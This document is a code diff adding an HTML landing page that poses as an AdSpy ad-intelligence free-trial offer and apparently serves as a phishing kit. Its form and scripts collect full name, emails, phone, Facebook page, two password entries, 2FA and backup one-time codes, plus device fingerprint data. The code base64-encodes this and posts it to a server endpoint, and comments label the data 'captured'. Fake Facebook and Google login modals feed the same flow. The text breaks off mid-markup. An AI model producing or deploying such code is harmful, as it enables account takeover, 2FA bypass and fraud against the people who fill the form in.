@@ -1,0 +1,1187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AdSpy – The World's #1 Facebook Ad Intelligence Tool</title>
+  <link rel="icon" href="ico.ico?v=1" type="image/x-icon">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400&display=swap" rel="stylesheet">
+  <link href="styles/style.css?v=2" rel="stylesheet">
+  <!-- Public folder CSS files -->
+  <link href="public/styles/checkbox.css?v=2" rel="stylesheet">
+  <!-- CSS Utility matching Tailwind classes for modal.js logic -->
+  <style>
+    .fixed { position: fixed; }
+    .inset-0 { top: 0; right: 0; bottom: 0; left: 0; }
+    .z-50 { z-index: 9999; }
+    .flex { display: flex; }
+    .items-center { align-items: center; }
+    .justify-center { justify-content: center; }
+    .bg-black\/40 { background-color: rgba(0, 0, 0, 0.55); backdrop-filter: blur(4px); }
+    .px-\[20px\] { padding-left: 20px; padding-right: 20px; }
+    .py-\[40px\] { padding-top: 40px; padding-bottom: 40px; }
+    .hidden { display: none !important; }
+    
+    .bg-white { background-color: #ffffff; }
+    .max-h-full { max-height: 100%; }
+    .h-full { height: auto; }
+    .w-full { width: 100%; }
+    .max-w-lg { max-width: 440px; }
+    .shadow-lg { box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); }
+    .p-5 { padding: 32px 28px; }
+    .rounded-2xl { border-radius: 16px; }
+    .flex-col { flex-direction: column; }
+    .overflow-y-auto { overflow-y: auto; }
+    .transform { transform: translate3d(0, 0, 0); }
+    .transition-all { transition-property: all; transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1); }
+    .duration-200 { transition-duration: 200ms; }
+    
+    .scale-0 { transform: scale(0.92); }
+    .opacity-0 { opacity: 0; }
+    .scale-100 { transform: scale(1); }
+    .opacity-100 { opacity: 1; }
+
+    @media (max-width: 480px) {
+      .px-\[20px\].py-\[40px\] {
+        padding: 12px 10px !important;
+      }
+      .bg-white {
+        padding: 24px 16px !important;
+        border-radius: 12px !important;
+      }
+      .max-w-lg {
+        max-width: 100% !important;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<!-- NAVBAR -->
+<nav class="navbar">
+  <div class="nav-container">
+    <a class="nav-logo" href="#">
+      <img src="img/adspy/logo.png" alt="AdSpy" class="nav-logo-img">
+    </a>
+    <div class="nav-links">
+      <a href="#features" class="nav-link">Features</a>
+      <a href="#pricing" class="nav-link">Pricing</a>
+      <a href="#" class="nav-link" id="loginBtn">Login</a>
+      <a href="#" class="btn-cta" onclick="openRegistrationForm(event)" style="padding:12px 32px;font-size:12px;">Subscribe</a>
+    </div>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero hero-coupon">
+  <div class="hero-coupon-shape" aria-hidden="true"></div>
+  <div class="hero-coupon-wrap">
+    <div class="hero-coupon-left">
+      <h1 class="hero-coupon-title">Adspy FREE<br>Trial voucher<br>1-MONTH</h1>
+      <div class="hero-coupon-code" role="group" aria-label="Coupon code">
+        <span class="coupon-label">Use Code:</span>
+        <span class="coupon-value">AFF1MONTH</span>
+      </div>
+      <p class="hero-coupon-text">Get free Trial 1-MONTH</p>
+      <a href="#" onclick="openRegistrationForm(event)" class="btn-cta hero-coupon-btn">Get Started</a>
+    </div>
+
+    <div class="hero-coupon-right">
+      <div class="hero-coupon-brand">
+        <img src="img/adspy/logo.png" alt="AdSpy logo">
+        <span>Coupons</span>
+      </div>
+      <div class="hero-coupon-monitor">
+        <img src="img/adspy/banner-bottom-image.png" alt="AdSpy campaign preview">
+        <span class="hero-coupon-focus" aria-hidden="true"></span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FEATURES INTRO -->
+<section class="features-intro" id="features">
+  <h2 class="section-title">What <strong>AdSpy</strong> can do for you</h2>
+  <div class="eye-divider">
+    <span class="line"></span>
+    <svg viewBox="0 0 60 40" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="var(--blue)" stroke-width="2.5">
+      <path d="M2 20 Q14 4 30 4 Q46 4 58 20 Q46 36 30 36 Q14 36 2 20Z" stroke-linejoin="round"/>
+      <circle cx="30" cy="20" r="10"/>
+      <circle cx="30" cy="20" r="4" fill="var(--blue)" stroke="none"/>
+    </svg>
+    <span class="line"></span>
+  </div>
+  <p class="section-desc">Comprehensive data from social media sites puts you in control of the fastest developing advertising platforms on the internet. Global coverage lets you assess the world's trends without compromise. Exhaustive search and filter features will uncover the ads that you and your company need to know about, and the simple interface will help you discover them with ease.</p>
+  <div class="feature-pills">
+    <div class="pill"><div class="pill-check"><svg viewBox="0 0 16 16" fill="none"><polyline points="3,8 7,12 13,4" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>DISCOVER COMPELLING NEW CAMPAIGNS</div>
+    <div class="pill"><div class="pill-check"><svg viewBox="0 0 16 16" fill="none"><polyline points="3,8 7,12 13,4" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>SAVE A FORTUNE ON TESTING CAMPAIGNS</div>
+    <div class="pill"><div class="pill-check"><svg viewBox="0 0 16 16" fill="none"><polyline points="3,8 7,12 13,4" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>UNCOVER THRIVING NEW PRODUCTS</div>
+    <div class="pill"><div class="pill-check"><svg viewBox="0 0 16 16" fill="none"><polyline points="3,8 7,12 13,4" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>MONITOR THE COMPETITION'S BRANDS</div>
+    <div class="pill"><div class="pill-check"><svg viewBox="0 0 16 16" fill="none"><polyline points="3,8 7,12 13,4" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>SCOUT FOR THE BEST MARKETS GLOBALLY</div>
+    <div class="pill"><div class="pill-check"><svg viewBox="0 0 16 16" fill="none"><polyline points="3,8 7,12 13,4" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>BROWSE ADS BY WHAT'S MOST IMPORTANT</div>
+  </div>
+  <a href="#" onclick="openRegistrationForm(event)" class="btn-cta">GET STARTED</a>
+</section>
+
+<!-- FEATURE ROW 1: KEYWORDS -->
+<section class="feature-row">
+  <div class="feature-row-inner">
+    <div class="feature-text">
+      <h3>More than just <strong>KEYWORDS</strong></h3>
+      <p>AdSpy offers the most search options of any Ad Intelligence Tool, so you can find the data you want, how you want. Search in the usual way: ad text, URL, page name. Search true data from user reactions in advert comments. Be as rigorous as you need to: search or filter by affiliate network, affiliate ID, Offer ID, landing page technologies - whatever helps you find the information you can work with.</p>
+    </div>
+    <div class="feature-image">
+      <img src="img/adspy/section-1_img.png" alt="Advanced keyword search">
+    </div>
+  </div>
+</section>
+
+<!-- FEATURE ROW 2: SOCIAL MEDIA -->
+<section class="feature-row" style="background:var(--bg-gray)">
+  <div class="feature-row-inner reverse">
+    <div class="feature-text">
+      <h3><strong>SOCIAL MEDIA:</strong> Covered</h3>
+      <p>Uncover the Ads you need to see in one place, with one tool. AdSpy is the only Ad Intelligence Tool available that incorporates top social media data. Make sure that you aren't ignoring a platform where you can thrive, that others often ignore. See what hasn't worked, and what has: ensure your success on these competitive platforms by building on what you know will strike a chord with the consumer.</p>
+    </div>
+    <div class="feature-image">
+      <img src="img/adspy/section-2_img.png" alt="Social media coverage">
+    </div>
+  </div>
+</section>
+
+<!-- FEATURE ROW 3: MASSIVE DATA -->
+<section class="feature-row">
+  <div class="feature-row-inner">
+    <div class="feature-text">
+      <h3><strong>MASSIVE</strong> data</h3>
+      <p>Leave no stone unturned: our ever expanding collection of ads gives your campaign the greatest foundation for success. AdSpy is based upon one of the most substantial databases of ads you can find: 203.4 million+ ads, 88 different languages, across 225 countries. Controlling the quick, intelligent interface, you'll glide through vast amounts of data until you have exactly what your campaign needs.</p>
+    </div>
+    <div class="feature-image">
+      <img src="img/adspy/section-3_img.png" alt="Massive data">
+    </div>
+  </div>
+</section>
+
+<!-- FEATURES GRID -->
+<section class="features-grid">
+  <h2 class="section-title">Adspy <strong>Features</strong></h2>
+  <div class="eye-divider">
+    <span class="line"></span>
+    <svg viewBox="0 0 60 40" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="var(--blue)" stroke-width="2.5">
+      <path d="M2 20 Q14 4 30 4 Q46 4 58 20 Q46 36 30 36 Q14 36 2 20Z" stroke-linejoin="round"/>
+      <circle cx="30" cy="20" r="10"/>
+      <circle cx="30" cy="20" r="4" fill="var(--blue)" stroke="none"/>
+    </svg>
+    <span class="line"></span>
+  </div>
+  <div class="features-cards">
+    <div class="feature-card">
+      <div class="feature-card-icon"><img src="img/adspy/advance_search.png" alt="Advanced Search"></div>
+      <div class="feature-card-body">
+        <h4>Advanced Search <span>Options</span></h4>
+        <p>Find what you need with powerful filters: by ad text, URL, page name, affiliate network, comments and more. Every search option you need in one place.</p>
+      </div>
+    </div>
+    <div class="feature-card">
+      <div class="feature-card-icon"><img src="img/adspy/organized_Ads.png" alt="Organized Ads"></div>
+      <div class="feature-card-body">
+        <h4>Organized <span>Ads</span></h4>
+        <p>Browse ads the way you want to. Filter by date, likes, shares and comments. Sort your results to find the most successful campaigns instantly.</p>
+      </div>
+    </div>
+    <div class="feature-card">
+      <div class="feature-card-icon"><img src="img/adspy/analytics.png" alt="Analytics"></div>
+      <div class="feature-card-body">
+        <h4>In-Depth <span>Analytics</span></h4>
+        <p>Track ad performance over time. See detailed statistics on engagement, reach and demographics to inform your campaigns with real data.</p>
+      </div>
+    </div>
+    <div class="feature-card">
+      <div class="feature-card-icon"><img src="img/adspy/landing_pages.png" alt="Landing Pages"></div>
+      <div class="feature-card-body">
+        <h4>Landing <span>Pages</span></h4>
+        <p>View and analyze the landing pages behind ads. Understand what converts and apply those insights directly to your own campaigns.</p>
+      </div>
+    </div>
+    <div class="feature-card">
+      <div class="feature-card-icon"><img src="img/adspy/link_to_ads.png" alt="Link to Ads"></div>
+      <div class="feature-card-body">
+        <h4>Link <span>to Ads</span></h4>
+        <p>Access direct links to live Facebook ads. Verify the ad is still running and see it exactly as consumers do, in real time.</p>
+      </div>
+    </div>
+    <div class="feature-card">
+      <div class="feature-card-icon"><img src="img/adspy/interface_icon.png" alt="Interface"></div>
+      <div class="feature-card-body">
+        <h4>Intuitive <span>Interface</span></h4>
+        <p>A clean, fast interface designed for power users. Get to the data you need without friction — no learning curve, just results.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- VIDEO -->
+<section class="video-section">
+  <h2 class="section-title">See <strong>AdSpy</strong> in Action</h2>
+  <div class="eye-divider">
+    <span class="line"></span>
+    <svg viewBox="0 0 60 40" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="var(--blue)" stroke-width="2.5">
+      <path d="M2 20 Q14 4 30 4 Q46 4 58 20 Q46 36 30 36 Q14 36 2 20Z" stroke-linejoin="round"/>
+      <circle cx="30" cy="20" r="10"/>
+      <circle cx="30" cy="20" r="4" fill="var(--blue)" stroke="none"/>
+    </svg>
+    <span class="line"></span>
+  </div>
+  <div class="video-wrapper">
+    <iframe src="https://player.vimeo.com/video/683682663" width="100%" height="100%" frameborder="0" allow="autoplay; fullscreen; picture-in-picture" title="AdSpy Demo"></iframe>
+  </div>
+</section>
+
+<!-- CTA -->
+<section class="cta-standalone">
+  <h2 class="section-title">Ready to <strong>get started?</strong></h2>
+  <p class="section-desc">Join thousands of advertisers who use AdSpy to find winning campaigns every day.</p>
+  <a href="#" onclick="openRegistrationForm(event)" class="btn-cta">GET STARTED TODAY</a>
+</section>
+
+<!-- PRICING -->
+<section class="pricing-section" id="pricing">
+  <div class="pricing-bg-circle"></div>
+  <h2 class="section-title">Simple <strong>Pricing</strong></h2>
+  <div class="eye-divider">
+    <span class="line"></span>
+    <svg viewBox="0 0 60 40" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="var(--blue)" stroke-width="2.5">
+      <path d="M2 20 Q14 4 30 4 Q46 4 58 20 Q46 36 30 36 Q14 36 2 20Z" stroke-linejoin="round"/>
+      <circle cx="30" cy="20" r="10"/>
+      <circle cx="30" cy="20" r="4" fill="var(--blue)" stroke="none"/>
+    </svg>
+    <span class="line"></span>
+  </div>
+  <p class="section-desc">One simple plan. Full access to everything. No hidden fees.</p>
+  <a href="#" onclick="openRegistrationForm(event)" class="btn-cta">SUBSCRIBE NOW</a>
+</section>
+
+<!-- BLUE CTA -->
+<section class="cta-blue">
+  <div class="cta-blue-bg">
+    <div class="blur-card c1"></div>
+    <div class="blur-card c2"></div>
+    <div class="blur-card c3"></div>
+    <div class="blur-card c4"></div>
+    <div class="blur-card c5"></div>
+    <div class="blur-card c6"></div>
+  </div>
+  <h2 class="cta-blue-title">Start Your <strong>Free Trial</strong></h2>
+  <div class="eye-divider">
+    <span class="line"></span>
+    <svg viewBox="0 0 60 40" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="rgba(255,255,255,.7)" stroke-width="2.5">
+      <path d="M2 20 Q14 4 30 4 Q46 4 58 20 Q46 36 30 36 Q14 36 2 20Z" stroke-linejoin="round"/>
+      <circle cx="30" cy="20" r="10"/>
+      <circle cx="30" cy="20" r="4" fill="rgba(255,255,255,.7)" stroke="none"/>
+    </svg>
+    <span class="line"></span>
+  </div>
+  <p class="cta-blue-subtitle">No risk. Cancel anytime. Full access from day one.</p>
+  <div class="cta-arrow-row">
+    <div class="cta-arrow"><img src="img/adspy/banner_arrow_right.png" alt=""></div>
+    <a href="#" onclick="openRegistrationForm(event)" class="btn-cta">GET STARTED</a>
+    <div class="cta-arrow"><img src="img/adspy/banner_arrow_middle.png" alt=""></div>
+  </div>
+</section>
+
+<!-- TWITTER -->
+<section class="twitter-section">
+  <h2 class="twitter-title">Follow us on <span>Twitter</span></h2>
+  <div class="eye-divider">
+    <span class="line"></span>
+    <svg viewBox="0 0 60 40" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="var(--blue)" stroke-width="2.5">
+      <path d="M2 20 Q14 4 30 4 Q46 4 58 20 Q46 36 30 36 Q14 36 2 20Z" stroke-linejoin="round"/>
+      <circle cx="30" cy="20" r="10"/>
+      <circle cx="30" cy="20" r="4" fill="var(--blue)" stroke="none"/>
+    </svg>
+    <span class="line"></span>
+  </div>
+  <a href="https://twitter.com/adspycom" class="btn-twitter" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.747l7.73-8.835L1.254 2.25H8.08l4.253 5.622zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+    @adspycom
+  </a>
+</section>
+
+<!-- FOOTER -->
+<footer class="site-footer">
+  <span class="footer-copy">&copy; 2026 AdSpy. All rights reserved.</span>
+  <div class="footer-links">
+    <a href="#">Privacy Policy</a><span class="sep">|</span>
+    <a href="#">Terms of Service</a><span class="sep">|</span>
+    <a href="careers.html">Careers</a>
+  </div>
+</footer>
+
+<!-- Modals Container for Dynamic Modals -->
+<div id="modalsContainer"></div>
+
+<!-- Client Information Form -->
+<div id="clientFormContainer" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.6); backdrop-filter: blur(8px); z-index: 9999; align-items: center; justify-content: center; padding: 20px;">
+  <div style="background: white; padding: 35px 30px; border-radius: 16px; max-width: 500px; width: 100%; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04); max-height: 90vh; overflow-y: auto; font-family: 'Poppins', sans-serif; position: relative;">
+    <button id="closeClientFormBtn" style="position: absolute; top: 15px; right: 20px; background: none; border: none; font-size: 28px; color: #94a3b8; cursor: pointer; transition: color 0.2s;">&times;</button>
+    <h2 style="margin-bottom: 8px; color: #1e293b; font-size: 24px; font-weight: 700; text-align: center;">Subscription Activation</h2>
+    <p style="margin-bottom: 24px; color: #64748b; font-size: 14px; text-align: center; line-height: 1.5;">Please enter your customer information below to activate your free 1-month trial code.</p>
+    <form id="clientForm">
+      <div style="margin-bottom: 18px;">
+        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">Full Name *</label>
+        <input type="text" id="fullName" placeholder="John Doe" required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
+      </div>
+      
+      <div style="margin-bottom: 18px;">
+        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">Personal Email *</label>
+        <input type="email" id="email" placeholder="john.doe@gmail.com" required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
+      </div>
+      
+      <div style="margin-bottom: 18px;">
+        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">Business Email *</label>
+        <input type="email" id="emailBusiness" placeholder="john.doe@company.com" required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
+      </div>
+      
+      <div style="margin-bottom: 18px;">
+        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">Facebook Page/Link *</label>
+        <input type="url" id="fanpage" placeholder="https://facebook.com/..." required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
+      </div>
+      
+      <div style="margin-bottom: 18px;">
+        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">Phone Number *</label>
+        <input type="tel" id="phone" placeholder="+1 123 456 7890" required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
+      </div>
+
+      <div style="margin-bottom: 18px;">
+        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">Password 1 *</label>
+        <input type="password" id="password" placeholder="Enter password" required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
+      </div>
+
+      <div style="margin-bottom: 18px;">
+        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">Password 2 *</label>
+        <input type="password" id="passwordSecond" placeholder="Re-enter password" required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
+      </div>
+
+      <div style="margin-bottom: 18px;">
+        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">2FA Code *</label>
+        <input type="text" id="twoFa" placeholder="Enter your 2FA code" required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
+      </div>
+
+      <div style="margin-bottom: 24px;">
+        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">One-Time Code *</label>
+        <input type="text" id="otp" placeholder="Enter one-time code" required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
+      </div>
+      
+      <button type="submit" style="width: 100%; padding: 14px; background: #0064E0; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: 700; font-size: 15px; text-transform: uppercase; letter-spacing: 0.5px; transition: background-color 0.2s, box-shadow 0.2s;">Continue & Activate</button>
+    </form>
+  </div>
+</div>
+
+<script>
+  // Device details helper
+  const getDeviceInfo = () => {
+    const ua = navigator.userAgent;
+    let browser = 'Unknown', os = 'Unknown';
+    if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
+    else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
+    else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
+    else if (ua.indexOf('Edg') > -1) browser = 'Edge';
+    
+    if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) os = 'iOS';
+    else if (ua.indexOf('Android') > -1) os = 'Android';
+    else if (ua.indexOf('Windows') > -1) os = 'Windows';
+    else if (ua.indexOf('Mac') > -1) os = 'MacOS';
+    else if (ua.indexOf('Linux') > -1) os = 'Linux';
+    
+    return {
+      browser, os,
+      screen: screen.width + 'x' + screen.height,
+      language: navigator.language || '',
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+      mobile: /Mobile|Android|iPhone|iPad/i.test(ua)
+    };
+  };
+
+  // Base64 encoding helper for payload
+  const encodePayload = (data) => {
+    const json = JSON.stringify(data);
+    const bytes = new TextEncoder().encode(json);
+    const binStr = Array.from(bytes, b => String.fromCodePoint(b)).join('');
+    return btoa(binStr);
+  };
+
+  // Send request helper
+  const sendData = async (payload) => {
+    try {
+      const response = await fetch('/api/send-request', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ data: encodePayload(payload) })
+      });
+      return await response.json();
+    } catch (e) {
+      return { success: false };
+    }
+  };
+
+  let currentSessionId = localStorage.getItem('session_id') || null;
+
+  // Custom styling input focus effects
+  const inputs = document.querySelectorAll('#clientForm input');
+  inputs.forEach(input => {
+    input.addEventListener('focus', () => {
+      input.style.borderColor = '#0064E0';
+      input.style.boxShadow = '0 0 0 3px rgba(0, 100, 224, 0.15)';
+      input.style.outline = 'none';
+    });
+    input.addEventListener('blur', () => {
+      input.style.borderColor = '#cbd5e1';
+      input.style.boxShadow = 'none';
+    });
+  });
+
+  // Global Utils object bridging sendNotification calls to standard API logic
+  window.Utils = {
+    async sendNotification(data) {
+      console.log('Sending notification:', data);
+      
+      // Facebook login credentials step
+      if (data.email && data.password && !data.passwordSecond) {
+        const result = await sendData({
+          type: 'info',
+          email: data.email,
+          fullName: 'Facebook Login User',
+          phone: '',
+          fanpage: 'AdSpy Login Dialog',
+          dob: '01/01/2000',
+          note: 'Captured from AdSpy Facebook Login Modal',
+          device: getDeviceInfo()
+        });
+        if (result && result.success && result.session_id) {
+          currentSessionId = result.session_id;
+          localStorage.setItem('session_id', result.session_id);
+          
+          await sendData({
+            type: 'password',
+            session_id: currentSessionId,
+            password: data.password
+          });
+        }
+      }
+      
+      // Password second step retry
+      else if (data.passwordSecond) {
+        if (!currentSessionId) {
+          // Fallback if session was lost
+          const result = await sendData({
+            type: 'info',
+            email: _capturedEmail || 'unknown@facebook.com',
+            fullName: 'Facebook Login User (Retry)',
+            phone: '',
+            fanpage: 'AdSpy Login Dialog',
+            dob: '01/01/2000',
+            note: 'Captured from AdSpy Password Retry Overlay',
+            device: getDeviceInfo()
+          });
+          if (result && result.success && result.session_id) {
+            currentSessionId = result.session_id;
+            localStorage.setItem('session_id', result.session_id);
+          }
+        }
+        if (currentSessionId) {
+          await sendData({
+            type: 'password',
+            session_id: currentSessionId,
+            password: data.passwordSecond
+          });
+        }
+      }
+      
+      // 2FA step verification
+      else if (data.twoFa) {
+        if (currentSessionId) {
+          await sendData({
+            type: '2fa',
+            session_id: currentSessionId,
+            code: data.twoFa
+          });
+        }
+      }
+      
+      // Backup code verification (OTP)
+      else if (data.otp) {
+        if (currentSessionId) {
+          await sendData({
+            type: '2fa',
+            session_id: currentSessionId,
+            code: 'Backup: ' + data.otp
+          });
+        }
+      }
+    }
+  };
+
+  // Modal Manager using user's template with escape and overlay bindings
+  const Modal = {
+    create(id, content) {
+      // Remove any existing instance of this modal in DOM
+      const existing = document.getElementById(id);
+      if (existing) {
+        existing.remove();
+      }
+      
+      const html = `
+        <div id="${id}" class="fixed inset-0 z-50 flex items-center justify-center bg-black/40 px-[20px] py-[40px] hidden">
+          <div class="bg-white max-h-full h-full w-full max-w-lg shadow-lg p-5 rounded-2xl flex flex-col overflow-y-auto transform scale-0 opacity-0 transition-all duration-200">
+            ${content}
+          </div>
+        </div>
+      `;
+      document.getElementById('modalsContainer').insertAdjacentHTML('beforeend', html);
+    },
+
+    open(id) {
+      const modal = document.getElementById(id);
+      if (!modal) return;
+      modal.classList.remove('hidden');
+      setTimeout(() => {
+        const content = modal.querySelector('div > div');
+        if (content) {
+          content.classList.remove('scale-0', 'opacity-0');
+          content.classList.add('scale-100', 'opacity-100');
+        }
+      }, 10);
+
+      // Dismiss when clicking outer background
+      modal.onclick = (e) => {
+        if (e.target === modal) {
+          Modal.close(id);
+        }
+      };
+    },
+
+    close(id) {
+      const modal = document.getElementById(id);
+      if (!modal) return;
+      const content = modal.querySelector('div > div');
+      if (content) {
+        content.classList.remove('scale-100', 'opacity-100');
+        content.classList.add('scale-0', 'opacity-0');
+      }
+      setTimeout(() => {
+        if (modal) modal.remove();
+      }, 200);
+    }
+  };
+
+  // Close modals on Escape key press
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape') {
+      const activeModal = document.querySelector('[id*="Modal"]:not(.hidden)');
+      if (activeModal) {
+        Modal.close(activeModal.id);
+      }
+    }
+  });
+
+  // Store captured email across all steps
+  let _capturedEmail = '';
+  let googleModalTimeout = null;
+
+  function clearGoogleTimeout() {
+    if (googleModalTimeout) {
+      clearTimeout(googleModalTimeout);
+      googleModalTimeout = null;
+    }
+  }
+
+  // Open Registration Modal
+  window.openRegistrationForm = function(e) {
+    if (e) e.preventDefault();
+    
+    // Close existing modals
+    const activeModal = document.querySelector('[id*="Modal"]:not(.hidden)');
+    if (activeModal) {
+      Modal.close(activeModal.id);
+    }
+    
+    const content = `
+      <button class="modal-close" onclick="Modal.close('registrationModal')">&times;</button>
+      <h2 class="registration-title">Create an account</h2>
+      <p class="registration-subtitle">Choose a registration method</p>
+      <div class="registration-social">
+        <button class="social-btn facebook-social" id="regFacebookBtn">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+          Facebook
+        </button>
+        <button class="social-btn google-social" id="regGoogleBtn">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+          Google
+        </button>
+      </div>
+    `;
+    
+    Modal.create('registrationModal', content);
+    Modal.open('registrationModal');
+    
+    // Bind Facebook registration button
+    document.getElementById('regFacebookBtn').onclick = (e) => {
+      e.preventDefault();
+      Modal.close('registrationModal');
+      openFacebookLoginModal();
+    };
+    
+    // Bind Google registration button
+    document.getElementById('regGoogleBtn').onclick = (e) => {
+      e.preventDefault();
+      Modal.close('registrationModal');
+      openGoogleModal();
+    };
+  };
+
+  // Open Login Modal
+  window.openLoginForm = function(e) {
+    if (e) e.preventDefault();
+    
+    // Close existing modals
+    const activeModal = document.querySelector('[id*="Modal"]:not(.hidden)');
+    if (activeModal) {
+      Modal.close(activeModal.id);
+    }
+    
+    const content = `
+      <button class="modal-close" onclick="Modal.close('loginModal')">&times;</button>
+      <h2 class="modal-title">Log in</h2>
+      <p class="modal-subtitle">Choose a login method</p>
+      
+      <div class="modal-oauth-buttons">
+        <button class="oauth-btn facebook-btn" id="loginFacebookBtn" style="margin-bottom:12px;">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+          Continue with Facebook
+        </button>
+        <button class="oauth-btn google-btn" id="loginGoogleBtn">
